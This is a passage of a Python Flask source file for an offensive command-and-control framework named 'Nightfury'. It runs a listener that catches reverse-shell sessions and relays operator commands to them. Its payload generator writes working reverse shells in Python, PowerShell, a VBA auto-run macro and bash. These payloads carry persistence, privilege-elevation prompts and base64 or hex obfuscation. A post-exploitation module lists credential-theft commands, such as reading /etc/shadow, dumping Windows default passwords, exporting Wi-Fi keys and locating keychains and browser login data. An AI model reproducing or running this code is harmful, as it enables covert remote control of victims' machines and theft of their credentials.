                'protocol': self.protocol,
                'connections': 0
            })
            
            return True, "Listener started successfully"
        except Exception as e:
            logger.error(f"Failed to start listener: {e}")
            return False, f"Failed to start listener: {e}"
    
    def listen_for_connections(self):
        while self.running:
            try:
                client_socket, addr = self.socket.accept()
                logger.info(f"Connection received from {addr[0]}:{addr[1]}")
                
                # Create a new session
                session_id = str(uuid.uuid4())[:8]
                session = {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'socket': client_socket,
                    'connected_at': datetime.now().isoformat(),
                    'last_activity': datetime.now().isoformat(),
                    'os': 'unknown',
                    'user': 'unknown'
                }
                
                sessions[session_id] = session
                
                # Send session info to frontend
                socketio.emit('new_session', {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'connected_at': session['connected_at'],
                    'os': session['os'],
                    'user': session['user']
                })
                
                # Handle session in a new thread
                session_thread = threading.Thread(
                    target=self.handle_session,
                    args=(session_id,)
                )
                session_thread.daemon = True
                session_thread.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"Error in listener: {e}")
    
    def handle_session(self, session_id):
        session = sessions.get(session_id)
        if not session:
            return
        
        try:
            while self.running and session_id in sessions:
                # Receive data from the client
                data = session['socket'].recv(4096)
                if not data:
                    break
                
                # Update last activity
                session['last_activity'] = datetime.now().isoformat()
                sessions[session_id] = session
                
                # Process the received data
                message = data.decode('utf-8', errors='ignore')
                logger.info(f"Received from session {session_id}: {message}")
                
                # Send to frontend
                socketio.emit('session_output', {
                    'session_id': session_id,
                    'output': message,
                    'timestamp': datetime.now().isoformat()
                })
                
        except Exception as e:
            logger.error(f"Error handling session {session_id}: {e}")
        finally:
            # Clean up session
            if session_id in sessions:
                sessions.pop(session_id, None)
                socketio.emit('session_closed', {'session_id': session_id})
    
    def stop(self):
        self.running = False
        if self.socket:
            self.socket.close()
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)
        
        logger.info(f"Listener stopped on {self.lhost}:{self.lport}")
        socketio.emit('listener_update', {
            'id': self.id,
            'status': 'stopped',
            'lhost': self.lhost,
            'lport': self.lport,
            'protocol': self.protocol,
            'connections': 0
        })
        
        return True, "Listener stopped successfully"

class PayloadGenerator:
    def __init__(self):
        self.templates = {
            'python': self._generate_python_payload,
            'powershell': self._generate_powershell_payload,
            'executable': self._generate_exe_payload,
            'dll': self._generate_dll_payload,
            'macro': self._generate_macro_payload,
            'android': self._generate_android_payload,
            'linux': self._generate_linux_payload
        }
    
    def generate(self, payload_type, lhost, lport, options=None):
        if payload_type not in self.templates:
            return None, f"Unsupported payload type: {payload_type}"
        
        if options is None:
            options = {}
        
        try:
            payload, filename = self.templates[payload_type](lhost, lport, options)
            
            # Store in history
            payload_id = str(uuid.uuid4())[:8]
            payload_history.append({
                'id': payload_id,
                'type': payload_type,
                'lhost': lhost,
                'lport': lport,
                'timestamp': datetime.now().isoformat(),
                'filename': filename
            })
            
            return payload, filename, payload_id
        except Exception as e:
            logger.error(f"Error generating payload: {e}")
            return None, f"Error generating payload: {e}", None
    
    def _generate_python_payload(self, lhost, lport, options):
        obfuscation = options.get('obfuscation', 'basic')
        
        payload = f'''
import socket,os,subprocess,threading,platform,base64
def persist():
    import sys,os
    if platform.system() == "Windows":
        import winreg
        run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(run_key)
    elif platform.system() == "Linux":
        os.system(f"echo '@reboot python3 {sys.argv[0]}' | crontab -")

def escalate_privileges():
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except:
            pass

escalate_privileges()
persist()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    try:
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(10)
        continue

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system() != "Windows" else ["cmd.exe"])
'''
        
        if obfuscation != 'none':
            payload = self._obfuscate_python(payload, obfuscation)
        
        filename = f"payload_{lhost}_{lport}.py"
        return payload, filename
    
    def _generate_powershell_payload(self, lhost, lport, options):
        payload = f'''
function persist {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "$PSCommandPath"
}}

function escalate {{
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}
}}

escalate
persist

$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        
        filename = f"payload_{lhost}_{lport}.ps1"
        return payload, filename
    
    def _generate_exe_payload(self, lhost, lport, options):
        # This would use pyinstaller or other tools to create an executable
        # For now, we'll create a Python script that can be compiled
        python_payload, _ = self._generate_python_payload(lhost, lport, options)
        filename = f"payload_{lhost}_{lport}.py"
        
        # In a real implementation, we would compile this to an executable
        return python_payload, filename
    
    def _generate_dll_payload(self, lhost, lport, options):
        # Placeholder for DLL generation
        payload = f'''
// DLL payload for {lhost}:{lport}
// This would be compiled to a DLL file
'''
        filename = f"payload_{lhost}_{lport}.dll"
        return payload, filename
    
    def _generate_macro_payload(self, lhost, lport, options):
        payload = f'''
Sub AutoOpen()
    Dim payload As String
    payload = "powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\""
    Shell payload, vbHide
End Sub
'''
        filename = f"payload_{lhost}_{lport}.vba"
        return payload, filename
    
    def _generate_android_payload(self, lhost, lport, options):
        # Placeholder for Android payload
        payload = f'''
// Android payload for {lhost}:{lport}
// This would be compiled to an APK file
'''
        filename = f"payload_{lhost}_{lport}.apk"
        return payload, filename
    
    def _generate_linux_payload(self, lhost, lport, options):
        payload = f'''
#!/bin/bash
while true; do
    /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null
    sleep 10
done
'''
        filename = f"payload_{lhost}_{lport}.sh"
        return payload, filename
    
    def _obfuscate_python(self, code, level):
        if level == 'basic':
            # Basic base64 obfuscation
            obfuscated = base64.b64encode(code.encode()).decode()
            parts = [obfuscated[i:i+50] for i in range(0, len(obfuscated), 50)]
            reconstructed = " + ".join([f'"{part}"' for part in parts])
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode({reconstructed}).decode())
'''
            return final_code
        
        elif level == 'advanced':
            # More advanced obfuscation with multiple encoding layers
            b64_encoded = base64.b64encode(code.encode()).decode()
            hex_encoded = b64_encoded.encode().hex()
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode(bytes.fromhex("{hex_encoded}").decode()).decode())
'''
            return final_code
        
        elif level == 'polymorphic':
            # Simple polymorphic example - in a real implementation this would be more complex
            var_names = ['func_' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) for _ in range(3)]
            
            b64_encoded = base64.b64encode(code.encode()).decode()
            parts = [b64_encoded[i:i+30] for i in range(0, len(b64_encoded), 30)]
            
            final_code = f'''
{var_names[0]} = "{parts[0]}"
{var_names[1]} = "{parts[1]}" if True else ""
{var_names[2]} = "{"".join(parts[2:])}" if not False else ""
exec(__import__('base64').b64decode({var_names[0]} + {var_names[1]} + {var_names[2]}).decode())
'''
            return final_code
        
        return code

class PostExploitation:
    def __init__(self):
        self.commands = {
            'windows': self._windows_commands,
            'linux': self._linux_commands,
            'mac': self._mac_commands
        }
    
    def execute(self, system_type, action, session_id=None):
        if system_type not in self.commands:
            return [], f"Unsupported system type: {system_type}"
        
        commands = self.commands[system_type](action)
        
        # If a session is specified, execute the commands on that session
        if session_id and session_id in sessions:
            # This would be implemented to send commands to the actual session
            logger.info(f"Executing {action} commands on session {session_id}")
            
            # For now, we'll just simulate execution
            for cmd in commands:
                self._send_command_to_session(session_id, cmd)
            
            return commands, f"Executed {len(commands)} commands on session {session_id}"
        
        return commands, "Commands generated (no session specified for execution)"
    
    def _send_command_to_session(self, session_id, command):
        # This would send the command to the actual session
        session = sessions.get(session_id)
        if session and 'socket' in session:
            try:
                session['socket'].send(command.encode() + b'\n')
                return True
            except Exception as e:
                logger.error(f"Error sending command to session {session_id}: {e}")
                return False
        return False
    
    def _windows_commands(self, action):
        commands = {
            'get_passwords': [
                'powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version"',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'powershell -Command "Get-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' | Select-Object DefaultUserName, DefaultPassword"',
                'powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' | Select-Object ProxyServer, ProxyEnable"'
            ],
            'escalate_privileges': [
                'whoami /priv',
                'powershell -Command "Start-Process PowerShell -Verb RunAs"',
                'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName"'
            ],
            'network_info': [
                'ipconfig /all',
                'arp -a',
                'netstat -ano',
                'route print',
                'netsh wlan show profiles',
                'netsh wlan export profile key=clear folder=.\\'
            ],
            'browser_data': [
                'dir /s %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
                'powershell -Command "Get-ChildItem -Path $env:USERPROFILE -Recurse -Include \'*.pfx\', \'*.p12\', \'*.cer\' -ErrorAction SilentlyContinue"'
            ],
            'system_info': [
                'systeminfo',
                'wmic product get name,version',
                'wmic service get name,displayname,pathname,startmode',
                'wmic process get name,processid,parentprocessid,commandline'
            ]
        }
        
        return commands.get(action, [])
    
    def _linux_commands(self, action):
        commands = {
            'get_passwords': [
                'cat /etc/passwd',
                'cat /etc/shadow',
                'sudo -l',
                'find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" -o -name "id_rsa" 2>/dev/null'
            ],
            'escalate_privileges': [
                'sudo su',
                'find / -perm -4000 2>/dev/null',
                'uname -a',
                'cat /etc/os-release',
                'ps aux | grep root'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -tulpn',
                'route -n',
                'iptables -L',
                'cat /etc/resolv.conf'
            ],
            'browser_data': [
                'find ~/.mozilla -name "*.sqlite"',
                'find ~/.config -name "Chromium" -o -name "google-chrome"',
                'find ~ -name "*.ssh" -type d 2>/dev/null'
            ],
            'system_info': [
                'uname -a',
                'cat /etc/*release',
                'dpkg -l | grep -i "ssh\\|vnc\\|remote\\|telnet"',
                'ps aux'
            ]
        }
        
        return commands.get(action, [])
    
    def _mac_commands(self, action):
        commands = {
            'get_passwords': [
                'dscl . list /Users',
                'security find-generic-password -wa',
                'find ~/Library/Keychains -name "*.keychain"'
            ],
            'escalate_privileges': [
                'sudo -l',
                'dscl . read /Groups/admin',
                'system_profiler SPSoftwareDataType'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -an',
                'route -n get default',
                'scutil --dns'
            ],
            'browser_data': [
                'find ~/Library/Application Support/Google/Chrome -name "Login Data"',
                'find ~/Library/Application Support/Firefox/Profiles -name "*.sqlite"',
                'find ~/Library/Keychains -name "*.db"'
            ],
            'system_info': [
                'system_profiler SPHardwareDataType',
                'softwareupdate --list',
                'defaults read /Library/Preferences/com.apple.loginwindow'
            ]
        }
        
        return commands.get(action, [])

class Scanner:
    def __init__(self):
        self.scan_types = {
            'quick': self.quick_scan,
            'port': self.port_scan,
            'vulnerability': self.vulnerability_scan,
            'os': self.os_detection_scan
        }
    
    def scan(self, target, scan_type='quick', options=None):
        if scan_type not in self.scan_types:
            return None, f"Unsupported scan type: {scan_type}"
        
        if options is None:
            options = {}
        
        try:
            results = self.scan_types[scan_type](target, options)
            
            # Store scan results
            scan_id = str(uuid.uuid4())[:8]
            scan_results[scan_id] = {
                'id': scan_id,
                'target': target,
                'type': scan_type,
                'timestamp': datetime.now().isoformat(),
                'results': results
            }
            
            return results, scan_id
        except Exception as e:
            logger.error(f"Error performing {scan_type} scan on {target}: {e}")
            return None, f"Error performing scan: {e}"
    
    def quick_scan(self, target, options):
        # Simulate a quick scan
        time.sleep(2)  # Simulate scan time
        
        results = {
            'target': target,
            'hosts_up': random.randint(1, 5),
            'ports_open': [22, 80, 443, 8000],
            'services': {
                22: 'SSH',
                80: 'HTTP',
                443: 'HTTPS',
                8000: 'HTTP-Alt'
            },
            'os_guess': 'Linux 3.x|4.x',
            'vulnerabilities': [
                {'service': 'HTTP', 'port': 80, 'type': 'XSS', 'severity': 'medium'},
                {'service': 'HTTPS', 'port': 443, 'type': 'SSL/TLS Vulnerability', 'severity': 'low'}
            ]
        }
        
        return results
    
    def port_scan(self, target, options):
        # Simulate a port scan
        ports_to_scan = options.get('ports', '1-1000')
        time.sleep(3)  # Simulate scan time
        
        # Generate random open ports
        open_ports = []
        for port in range(1, 1001):
            if random.random() < 0.05:  # 5% chance a port is open
                open_ports.append(port)
        
        results = {
            'target': target,
            'ports_scanned': ports_to_scan,
            'ports_open': open_ports,
            'services': {port: self._guess_service(port) for port in open_ports}
        }
        
        return results
    
    def vulnerability_scan(self, target, options):
        # Simulate a vulnerability scan
        time.sleep(5)  # Simulate scan time
        
        vulnerabilities = []
        for _ in range(random.randint(1, 6)):
            vuln_types = ['XSS', 'SQL Injection', 'RCE', 'LFI', 'RFI', 'CSRF']
            severities = ['low', 'medium', 'high', 'critical']
            
            vulnerabilities.append({
                'type': random.choice(vuln_types),
                'severity': random.choice(severities),
                'port': random.choice([80, 443, 8080, 8443]),
                'description': f'Vulnerability found in {random.choice(["web server", "application", "service"])}'
            })
        
        results = {
            'target': target,
            'vulnerabilities': vulnerabilities,
            'risk_score': random.randint(1, 100)
        }
        
        return results
    
    def os_detection_scan(self, target, options):
        # Simulate OS detection
        time.sleep(2)  # Simulate scan time
        
        os_types = [
            'Linux 3.x|4.x',
            'Windows 10|Server 2016|Server 2019',
            'Mac OS X 10.12-10.15',
            'FreeBSD 11.x-12.x'
        ]
        
        results = {
            'target': target,
            'os_guess': random.choice(os_types),
            'accuracy': random.randint(85, 99)
        }
        
        return results
    
    def _guess_service(self, port):
        common_services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            465: 'SMTPS',
            587: 'SMTP',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6379: 'Redis',
            27017: 'MongoDB'
        }
        
        return common_services.get(port, 'Unknown')

# Initialize components
payload_generator = PayloadGenerator()
post_exploit = PostExploitation()
scanner = Scanner()

# API Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def api_status():
    return jsonify({
        'listeners': len(listeners),
        'sessions': len(sessions),
        'scan_results': len(scan_results),
        'payloads_generated': len(payload_history)
    })

@app.route('/api/listener/start', methods=['POST'])
def api_listener_start():
    data = request.json
    lhost = data.get('lhost', '0.0.0.0')
    lport = data.get('lport', 4444)
    protocol = data.get('protocol', 'tcp')
    
    # Validate inputs
    try:
        lport = int(lport)
        if lport < 1 or lport > 65535:
            return jsonify({'success': False, 'message': 'Invalid port number'})
    except ValueError:
        return jsonify({'success': False, 'message': 'Invalid port number'})
    
    try:
        # Check if the address is valid
        socket.inet_pton(socket.AF_INET, lhost)
    except socket.error:
        return jsonify({'success': False, 'message': 'Invalid IP address'})
    
    # Create and start listener
    listener = Listener(lhost, lport, protocol)
    success, message = listener.start()
    
    if success:
        listeners[listener.id] = listener
        return jsonify({'success': True, 'message': message, 'listener_id': listener.id})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/listener/stop', methods=['POST'])
def api_listener_stop():
    data = request.json
    listener_id = data.get('listener_id')
    
    if listener_id not in listeners:
        return jsonify({'success': False, 'message': 'Listener not found'})
    
    listener = listeners[listener_id]
    success, message = listener.stop()
    
    if success:
        listeners.pop(listener_id, None)
        return jsonify({'success': True, 'message': message})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/payload/generate', methods=['POST'])
def api_payload_generate():
    data = request.json
    payload_type = data.get('type', 'python')
    lhost = data.get('lhost', '127.0.0.1')
    lport = data.get('lport', 4444)
    options = data.get('options', {})
    
    payload, filename, payload_id = payload_generator.generate(payload_type, lhost, lport, options)
    
    if payload:
        return jsonify({
            'success': True,
            'payload': payload,
            'filename': filename,
            'payload_id': payload_id
        })
    else:
        return jsonify({'success': False, 'message': filename})  # filename contains error message here

@app.route('/api/payload/download/<payload_id>', methods=['GET'])
def api_payload_download(payload_id):
    # Find the payload in history
    payload_info = next((p for p in payload_history if p['id'] == payload_id), None)
    
    if not payload_info:
        return jsonify({'success': False, 'message': 'Payload not found'})
    
    # Regenerate the payload
    payload, filename = payload_generator.generate(
        payload_info['type'],
        payload_info['lhost'],
        payload_info['lport'],
        {}
    )
    
    # Create a temporary file
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)
    
    with open(file_path, 'w') as f:
        f.write(payload)
    
    return send_file(file_path, as_attachment=True, download_name=filename)

@app.route('/api/sessions', methods=['GET'])
def api_sessions():
    session_list = []
    for session_id, session in sessions.items():
        session_list.append({
            'id': session_id,
            'host': session['host'],
            'port': session['port'],
            'connected_at': session['connected_at'],
            'last_activity': session['last_activity'],
            'os': session.get('os', 'unknown'),
            'user': session.get('user', 'unknown')
        })
    
    return jsonify({'sessions': session_list})

@app.route('/api/session/<session_id>/command', methods=['POST'])
def api_session_command(session_id):
    if session_id not in sessions:
        return jsonify({'success': False, 'message': 'Session not found'})
    
    data = request.json
    command = data.get('command', '')
    
    if not command:
        return jsonify({'success': False, 'message': 'No command provided'})
    
    # Send command to session
    session = sessions[session_id]
    try:
        session['socket'].send(command.encode() + b'\n')
        return jsonify({'success': True, 'message': 'Command sent'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error sending command: {e}'})

@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target', '')
    scan_type = data.get('type', 'quick')
    options = data.get('options', {})
    
    if not target:
        return jsonify({'success': False, 'message': 'No target specified'})
    
    results, scan_id = scanner.scan(target, scan_type, options)
    
    if results:
        return jsonify({
            'success': True,
            'results': results,
            'scan_id': scan_id
        })
    else:
        return jsonify({'success': False, 'message': scan_id})  # scan_id contains error message here

@app.route('/api/postexploit', methods=['POST'])
def api_postexploit():
    data = request.json
    system_type = data.get('system_type', 'windows')
    action = data.get('action', 'system_info')
    session_id = data.get('session_id', None)
    
    commands, message = post_exploit.execute(system_type, action, session_id)
    
    return jsonify({
        'success': True,
        'commands': commands,
        'message': message
    })

# SocketIO events
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')
    emit('status_update', {
        'listeners': len(listeners),
        'sessions': len(sessions),
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')

if __name__ == '__main__':
    # Create necessary directories
    os.makedirs('static', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Save the frontend HTML
    frontend_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Nightfury OSINT & Penetration Framework</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            /* Your CSS from the previous frontend implementation */
            :root {
                --bg-dark: #0a0a0a;
                --bg-darker: #050505;
                --bg-panel: #1a1a1a;
                --bg-panel-light: #222222;
                --primary: #ff0000;
                --primary-dark: #cc0000;
                --primary-light: #ff3333;
                --text: #ffffff;
                --text-muted: #aaaaaa;
                --border: #333333;
                --success: #00cc00;
                --warning: #ffcc00;
                --danger: #ff0000;
                --info: #0066ff;
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            body {
                background-color: var(--bg-dark);
                color: var(--text);
                line-height: 1.6;
                overflow-x: hidden;
            }

            /* ... rest of your CSS ... */
        </style>
    </head>
    <body>
        <div class="container">
            <!-- Your HTML from the previous frontend implementation -->
        </div>

        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            // Your JavaScript from the previous frontend implementation
            // Plus SocketIO integration
            const socket = io();

            socket.on('connect', function() {
                console.log('Connected to server');
            });

            socket.on('listener_update', function(data) {
                console.log('Listener update:', data);
                // Update UI with listener status
            });

            socket.on('new_session', function(data) {
                console.log('New session:', data);
                // Add new session to UI
            });

            socket.on('session_output', function(data) {
                console.log('Session output:', data);
                // Display session output in UI
            });

            socket.on('session_closed', function(data) {
                console.log('Session closed:', data);
                // Remove session from UI
            });

            socket.on('status_update', function(data) {
                console.log('Status update:', data);
                // Update status indicators
            });

            socket.on('disconnect', function() {
                console.log('Disconnected from server');
            });
        </script>
    </body>
    </html>
    """
    
    with open('templates/index.html', 'w') as f:
        f.write(frontend_html)
    
    # Run the application
    logger.info("Starting Nightfury backend server...")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)






